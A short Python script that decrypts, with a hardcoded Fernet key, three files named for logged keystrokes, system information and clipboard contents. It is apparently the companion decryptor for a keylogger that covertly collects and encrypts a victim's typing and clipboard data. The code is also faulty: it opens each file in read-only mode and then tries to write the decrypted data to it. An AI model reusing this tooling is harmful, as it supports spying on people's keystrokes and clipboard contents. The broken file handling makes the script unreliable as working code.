from cryptography.fernet import Fernet

key = "Vwu1_396jJPabXw0Fh7i_NwWXx6fSCX_BnpluxaOSug="

keys_information_encryption = "encrypted_key_logged.txt"
system_information_encryption = "encrypted_systeminfo.txt"
clipboard_information_encryption = "encrypted_clipboard.txt"

encrypted_files = [system_information_encryption, clipboard_information_encryption, keys_information_encryption]
count = 0

for decrypting_file in encrypted_files:
   
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(encrypted_files[count], 'rb') as f:
        f.write(decrypted)

    count += 1
